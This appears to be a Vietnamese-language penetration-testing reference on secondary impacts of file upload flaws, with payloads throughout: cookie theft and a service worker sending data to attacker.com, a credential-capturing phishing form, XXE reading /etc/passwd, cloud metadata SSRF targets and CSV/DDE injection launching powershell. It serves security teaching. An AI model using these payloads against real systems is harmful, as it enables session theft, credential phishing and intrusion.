# File Upload — Secondary Impacts

## Tổng quan

File upload vulnerability không chỉ dẫn đến Remote Code Execution. Khi RCE không khả thi (server không execute uploaded file), attacker vẫn có thể khai thác file upload cho nhiều mục đích tấn công khác nhau. Mỗi loại file có thể tạo ra impact riêng, biến chức năng upload thành vector cho XSS, XXE, SSRF, CSV injection, và nhiều lỗ hổng khác.

## Bảng impact theo loại file

| Extension        | Loại tấn công                        |
| ---------------- | ------------------------------------ |
| ASP/ASPX/PHP/JSP | Web shell / RCE                      |
| SVG              | Stored XSS / SSRF / XXE              |
| GIF              | Stored XSS / SSRF                    |
| CSV              | CSV Injection                        |
| XML              | XXE                                  |
| AVI              | LFI / SSRF                           |
| HTML/JS          | HTML Injection / XSS / Open Redirect |
| PNG/JPEG         | Pixel Flood Attack (DoS)             |
| ZIP              | RCE via LFI / DoS                    |
| PDF/PPTX         | SSRF / Blind XXE                     |

## XSS qua File Upload

### HTML File Upload

Upload file `.html` chứa JavaScript — nếu file được serve cùng origin:

```html
<html>
  <body>
    <script>
      document.location = "http://attacker.com/steal?cookie=" + document.cookie;
    </script>
  </body>
</html>
```

**Điều kiện**: File phải được serve từ cùng origin với ứng dụng (same-origin policy).

### SVG + XSS

SVG là XML-based, hỗ trợ JavaScript:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">
    <script>alert(document.domain)</script>
</svg>
```

```xml
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.cookie)">
</svg>
```

### SVG + Open Redirect

```xml
<svg xmlns="http://www.w3.org/2000/svg">
    <script>
        window.location = 'http://attacker.com/phishing';
    </script>
</svg>
```

### GIF + XSS

Một số browser parse GIF comment → nếu comment chứa script tag và file được embed trong HTML context, XSS có thể xảy ra.

### JS File Upload → Service Worker

Upload file `.js` + XSS vulnerability = có thể đăng ký Service Worker:

```javascript
// Uploaded: /uploads/sw.js
self.addEventListener("fetch", function (event) {
  // Intercept và modify mọi request
  event.respondWith(
    fetch(event.request).then(function (response) {
      // Exfiltrate data
      fetch("http://attacker.com/log", {
        method: "POST",
        body: JSON.stringify({ url: event.request.url }),
      });
      return response;
    }),
  );
});
```

Service Worker persist trên browser → tiếp tục intercept traffic sau khi upload file bị xóa.

## XXE qua File Upload

### SVG + XXE

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">
    <text x="10" y="50">&xxe;</text>
</svg>
```

### XML File Upload

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

### Office Documents (DOCX/XLSX/PPTX)

Office format = ZIP chứa XML. Inject XXE vào `[Content_Types].xml`:

```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "http://attacker.com/xxe">
]>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
    <Default Extension="rels" ContentType="&xxe;"/>
</Types>
```

### PDF + XXE/SSRF

Crafted PDF có thể trigger SSRF khi server parse/render PDF content. Đặc biệt nguy hiểm với PDF generation libraries.

## SSRF qua File Upload

### Image URL Fetch

Khi server cho phép cung cấp URL để fetch ảnh:

```
http://169.254.169.254/latest/meta-data/       ← AWS metadata
http://metadata.google.internal/               ← GCP metadata
http://169.254.169.254/metadata/v1/            ← DigitalOcean
http://127.0.0.1:6379/                         ← Internal Redis
http://127.0.0.1:9200/                         ← Internal Elasticsearch
```

### SVG + SSRF

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
    <!ENTITY ssrf SYSTEM "http://internal-service:8080/admin">
]>
<svg xmlns="http://www.w3.org/2000/svg">
    <text>&ssrf;</text>
</svg>
```

### CORS bypass qua PDF/Flash

Upload specially crafted PDF hoặc SWF → bypass CORS restrictions:

- PDF có thể thực hiện cross-origin requests trong một số PDF viewer
- Flash (SWF) có thể bypass same-origin nếu `crossdomain.xml` cho phép

## Cross-site Content Hijacking

### crossdomain.xml

Upload `crossdomain.xml` vào web root:

```xml
<?xml version="1.0"?>
<cross-domain-policy>
    <allow-access-from domain="*"/>
</cross-domain-policy>
```

→ Flash/PDF từ domain khác có thể đọc dữ liệu từ website target.

### clientaccesspolicy.xml

Upload `clientaccesspolicy.xml` cho Silverlight:

```xml
<?xml version="1.0" encoding="utf-8"?>
<access-policy>
    <cross-domain-access>
        <policy>
            <allow-from http-request-headers="*">
                <domain uri="*"/>
            </allow-from>
            <grant-to>
                <resource path="/" include-subpaths="true"/>
            </grant-to>
        </policy>
    </cross-domain-access>
</access-policy>
```

### JPG chứa Flash object

Upload `.jpg` thực chất là Flash → victim experience cross-site content hijacking khi browser render "ảnh".

## CSV Injection

### Cơ chế

Nếu ứng dụng cho phép upload CSV và sau đó export/download cho users khác, CSV cells chứa formula sẽ được thực thi khi mở bằng Excel/LibreOffice:

```csv
Name,Email,Amount
=cmd|'/C calc'!A0,user@example.com,1000
=HYPERLINK("http://attacker.com/steal?data="&A1),test@test.com,500
```

### DDE (Dynamic Data Exchange)

```csv
Name,Value
=DDE("cmd","/C powershell -e ENCODED_PAYLOAD","")
```

## Denial of Service

### Pixel Flood (Image)

Upload ảnh có dimensions cực lớn (e.g., 65535 x 65535 pixels) nhưng file size nhỏ (compressed). Khi server cố decompress/process → memory exhaustion:

```
Compressed: ~100KB
Uncompressed: 65535 * 65535 * 4 bytes = ~16GB RAM
```

### Disk Space Exhaustion

Upload file rất lớn hoặc upload nhiều lần để tràn ổ đĩa.

### Small File DoS

Upload file rất nhỏ (0 bytes hoặc vài bytes) có thể trigger error trong processing logic, gây resource lock hoặc crash.

### ZIP Bomb

File ZIP nhỏ (~42KB) giải nén thành petabytes dữ liệu.

## Phishing qua Upload

Upload HTML page giả mạo login form:

```html
<html>
  <body>
    <h2>Session Expired - Please Login Again</h2>
    <form action="http://attacker.com/capture" method="POST">
      <input type="text" name="username" placeholder="Username" /><br />
      <input type="password" name="password" placeholder="Password" /><br />
      <input type="submit" value="Login" />
    </form>
  </body>
</html>
```

File được host trên domain hợp lệ → tăng tính thuyết phục.

## Antivirus Testing

Upload nội dung EICAR test string để kiểm tra xem server có chạy antivirus:

```
X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*
```

Nếu bị chặn → server có AV scanning → race condition window khi scan.

## Malware Distribution

Upload file thực thi (`.exe`, `.msi`, `.bat`) vào public-accessible directory:

- Victims download và chạy → compromised
- Website bị lạm dụng làm malware distribution host

## LFI → RCE Chain

Upload file với extension an toàn (`.txt`, `.jpg`) chứa PHP code → file không execute trực tiếp. Nhưng nếu ứng dụng có **Local File Inclusion** (LFI):

```php
// Vulnerable code
include($_GET['page']);

// Attacker
http://target/index.php?page=uploads/shell.jpg
// → PHP include shell.jpg → parse PHP code trong file → RCE
```

## Decision Tree: Secondary Impacts

```
RCE không khả thi (file không execute)?
│
├── File accessible cùng origin?
│   ├── CÓ
│   │   ├── Upload HTML/SVG → Stored XSS
│   │   ├── Upload JS → Service Worker exploitation
│   │   └── Upload crossdomain.xml → Content hijacking
│   └── KHÔNG
│       └── Limited impact
│
├── Server parse file content?
│   ├── XML parser → XXE (SVG, XML, DOCX)
│   ├── Image processor → SSRF (URL fetch), DoS (pixel flood)
│   └── PDF renderer → SSRF, XXE
│
├── File được download bởi users khác?
│   ├── CSV → Formula injection
│   ├── EXE/MSI → Malware distribution
│   └── HTML → Phishing
│
├── Ứng dụng có LFI?
│   └── Upload safe extension + LFI → RCE
│
└── Ứng dụng có URL fetch?
    └── SSRF → internal services, cloud metadata
```
